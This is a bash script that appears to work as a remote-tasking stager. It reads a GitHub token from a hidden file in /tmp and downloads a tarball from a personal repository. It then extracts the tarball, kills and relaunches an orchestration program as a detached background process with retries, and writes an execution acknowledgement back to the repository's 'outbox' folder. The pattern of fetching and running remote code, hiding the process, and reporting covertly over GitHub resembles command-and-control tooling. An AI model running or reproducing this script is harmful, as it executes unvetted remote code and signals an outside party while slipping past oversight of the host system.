#!/bin/bash
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok); mkdir -p /tmp/b12; cd /tmp
timeout 60 curl -fsSL -H "Authorization: Bearer $T" https://api.github.com/repos/heinzo666/sync-assets/contents/lab/mint16.tgz | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/b12.tgz","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))' && tar xzf b12.tgz -C /tmp/b12 && echo EXTRACTED_$?
pkill -f qp_orch2 ; sleep 2
cd /tmp/b12 && rm -f /tmp/orch_oz075657.log
setsid nohup bash -c 'for i in 1 2 3; do env HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf STAGE=full /tmp/env/bin/python -u qp_orch2.py oz075657 >> /tmp/orch_oz075657.log 2>&1 && break; echo RETRY_$i >> /tmp/orch_oz075657.log; sleep 8; done' < /dev/null &
sleep 3
# self-ack so we can see execution proof even without reading pod
BODY=$(printf '{"task":"run_orch","tag":"%s","ts":%d}' "oz075657" 1790150016 | base64 -w0)
curl -s -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json"  https://api.github.com/repos/heinzo666/sync-assets/contents/lab/outbox/ran_oz075657_1790150016.json  -d "{\"message\":\"ran\",\"content\":\"$BODY\"}" -o /dev/null
echo LAUNCHED_AND_ACKED
